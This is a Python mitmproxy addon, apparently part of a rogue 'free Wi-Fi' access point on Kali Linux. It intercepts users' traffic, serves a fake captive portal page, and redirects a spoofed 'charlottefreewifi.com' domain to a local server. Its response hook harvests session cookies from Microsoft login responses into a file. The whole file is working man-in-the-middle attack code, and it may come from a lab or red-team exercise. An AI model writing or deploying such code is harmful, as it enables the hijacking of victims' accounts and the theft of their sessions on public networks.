from mitmproxy import http, ctx
import time, os

tls_verified = False
STATIC_PATH = "/home/kali/access_point/CaptivePortal/"

class RedirectToCaptivePortal:
    def request(self, flow: http.HTTPFlow) -> None:
        global tls_verified

        whitelist = ["charlottefreewifi.com", "www.charlottefreewifi.com"]
        allowed_extensions = [".exe", ".zip", ".pdf", ".jpg", ".png", ".p12", ".cer", ".pem"]

        captive_portals = [
                "connectivitycheck.gstatic.com",
                "clients3.google.com",
                "www.msftconnecttest.com",
                "msftncsi.com",
                "captive.apple.com",
                "detectportal.firefox.com"
        ]

        if flow.request.host in captive_portals:
            ctx.log.info(f"Allowing captive portal check for {flow.request.host}")
            return

        ctx.log.info(f"Processing request: {flow.request.host}{flow.request.path}")

        # Allow access to whitelisted domains
        if flow.request.host in whitelist:
            ctx.log.info(f"Whitelisted domain: {flow.request.host}, allowing direct access.")
            flow.request.host = "192.168.1.1"
            flow.request.port = 8081
            return  # Allow traffic
        
        if flow.client_conn.tls_established:
            ctx.log.info(f"TSL Established for {flow.request.host}, enabling full access")
            tls_verified = True
        
        if tls_verified:
            return        

        file_path = os.path.join(STATIC_PATH, flow.request.path.lstrip("/"))
        if not tls_verified and os.path.exists(file_path) and not flow.request.path.endswith("/"):
            with open(file_path, "rb") as f:
                file_content = f.read()
                
            mime_types = {
                    ".html": "text/html",
                    ".css": "text/css",
                    ".js": "application/javascript",
                    ".png": "image/png",
                    ".jpg": "image/jpeg",
                    ".jpeg": "image/jpeg",
                    ".gif": "image/gif",
                    ".otf": "font/otf",
                    ".woff": "font/woff",
                    ".woff2": "font/woff2"
            }
            file_ext = os.path.splitext(file_path)[1]
            mime_type = mime_types.get(file_ext, "application/octect-stream")

            flow.response = http.Response.make(
                200,
                file_content,
                {
                    "Content-Type": "mime_type"
                }
            )   
            return  # Stop further processing

        # Block non-whitelisted requests if TLS is not established
        if not flow.client_conn.tls_established:
            #tls_verified = False
            ctx.log.info(f"Blocking request for {flow.request.host}: Client certificate missing.")

            unique_id = str(time.time())  # Unique value to force cache bypass

            index_path = os.path.join(STATIC_PATH, "index.html")
            if os.path.exists(index_path):
                with open(index_path, "r") as f:
                    html_content = f.read()
            else:
                html_content = "<h1>403 Forbidden</h1><p>Custom error page not found </p>"

            flow.response = http.Response.make(
                    403,
                    html_content.encode("utf-8"),
                    {
                        "Content-Type": "text/html",
                        "Cache-Control": "no-store, no-cache, must-revalidate, max-age=0, no-transform",
                        "Pragma": "no-cache",
                        "Expires": "0",
                        "Refresh": "20",
                        "ETag": unique_id,
                        "Vary": "User-Agent"
                    }
            )
            return

    def response(self, flow: http.HTTPFlow) -> None:
        if "login.microsoftonline.com" in flow.request.pretty_host:
            with open("captured_cookies.txt", "a") as f:
                f.write(f"[*] Captured response cookies for {flow.request.pretty_host}:\n")
                for cookie in flow.response.cookies:
                    f.write(f"{cookie}: {flow.response.cookies[cookie]}\n\n")
            

addons = [
    RedirectToCaptivePortal()
]
